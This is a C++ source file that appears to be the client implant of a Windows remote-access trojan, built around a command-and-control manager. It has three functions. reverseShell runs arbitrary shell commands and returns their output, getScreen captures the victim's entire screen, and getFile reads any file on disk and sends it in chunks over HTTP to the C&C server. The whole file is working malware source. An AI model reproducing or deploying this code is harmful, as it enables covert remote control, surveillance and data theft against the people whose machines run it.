#include <Windows.h>
#include <iostream>
#include <ole2.h>
#include <olectl.h>
#include "commandManager.h"
#include "cncManager.h"
#include "DDproto.h"

commandManager::commandManager() {
}

std::string commandManager::reverseShell(std::string cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof(buffer), pipe) != NULL)
            result += buffer;
    }
    catch (...) {
        _pclose(pipe);
        throw;
    }
    _pclose(pipe);
    return result;
}


/* 화면 스샷 구현용 WriteFile 삭제하고 Stream을 바로 sendData로 넘겨줘야할듯*/
LPVOID commandManager::getScreen() {
    {
        int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
        HDC hdcSource = GetDC(NULL);
        HDC hdcMemory = CreateCompatibleDC(hdcSource);

        int capX = GetDeviceCaps(hdcSource, HORZRES);
        int capY = GetDeviceCaps(hdcSource, VERTRES);

        HBITMAP hBitmap = CreateCompatibleBitmap(hdcSource, w, h);

        HBITMAP hBitmapOld = (HBITMAP)SelectObject(hdcMemory, hBitmap);

        BitBlt(hdcMemory, 0, 0, w, h, hdcSource, 0, 0, SRCCOPY);

        hBitmap = (HBITMAP)SelectObject(hdcMemory, hBitmapOld);

        DeleteDC(hdcSource);
        DeleteDC(hdcMemory);

        HPALETTE hpal = NULL;

        PICTDESC pd;

        pd.cbSizeofstruct = sizeof(PICTDESC);
        pd.picType = PICTYPE_BITMAP;
        pd.bmp.hbitmap = hBitmap;
        pd.bmp.hpal = hpal;

        LPPICTURE picture;
        HRESULT res = OleCreatePictureIndirect(&pd, IID_IPicture, false,
            reinterpret_cast<void**>(&picture));

        LPSTREAM stream;
        res = CreateStreamOnHGlobal(0, true, &stream);


        LONG bytes_streamed;
        res = picture->SaveAsFile(stream, true, &bytes_streamed);

        HGLOBAL mem = 0;
        GetHGlobalFromStream(stream, &mem);
        LPVOID data = GlobalLock(mem);

        this->screen_len = bytes_streamed;

        UCHAR* ptr = new UCHAR[this->screen_len];
        memset(ptr, 0, this->screen_len);
        memcpy(ptr, data, this->screen_len);


        GlobalUnlock(mem);

        stream->Release();
        picture->Release();

        return (LPVOID)ptr;
    }
}

void commandManager::getFile(std::string& path, LPCWSTR server) {
    cncManager client(server);
    FILE* fp = NULL;
    UCHAR* buffer = new UCHAR[sizeof(DDprotocol)+DATA_BUF_SIZE]; //450MB
    memset(buffer, 0, sizeof(DDprotocol) + DATA_BUF_SIZE);
    DWORD sequence = 0;
    ULONG64 size = 0;

    DDprotocol* dataFrame = new DDprotocol;
    dataFrame->type = ftpResponse;
    dataFrame->seq = 0;

    

    fopen_s(&fp, path.c_str(), "rb+");
    if (fp) {
        while (!feof(fp)) {
            size = fread(buffer + sizeof(DDprotocol), 1, DATA_BUF_SIZE, fp);

            if (sequence == 0 && size < DATA_BUF_SIZE) {
                dataFrame->len = size;
                dataFrame->seq = 0;
                memcpy(buffer, dataFrame, sizeof(DDprotocol));
                client.sendHttpRequest((LPVOID)buffer, sizeof(DDprotocol) + size);
                break;
            }
            else if (size == DATA_BUF_SIZE) {
                sequence++;
                dataFrame->len = size;
                dataFrame->seq = sequence;
                std::cout << dataFrame->seq << std::endl;
                memcpy(buffer, dataFrame, sizeof(DDprotocol));
                client.sendHttpRequest((LPVOID)buffer, sizeof(DDprotocol) + size);
            }
            else if (sequence != 0 && size < DATA_BUF_SIZE) {
                sequence++;
                dataFrame->len = size;
                dataFrame->seq = 0;
                std::cout << dataFrame->seq << std::endl;
                memcpy(buffer, dataFrame, sizeof(DDprotocol));
                client.sendHttpRequest((LPVOID)buffer, sizeof(DDprotocol) + size);
            }
            


        }
        fclose(fp);
    }
    delete dataFrame;
    delete[] buffer;

}

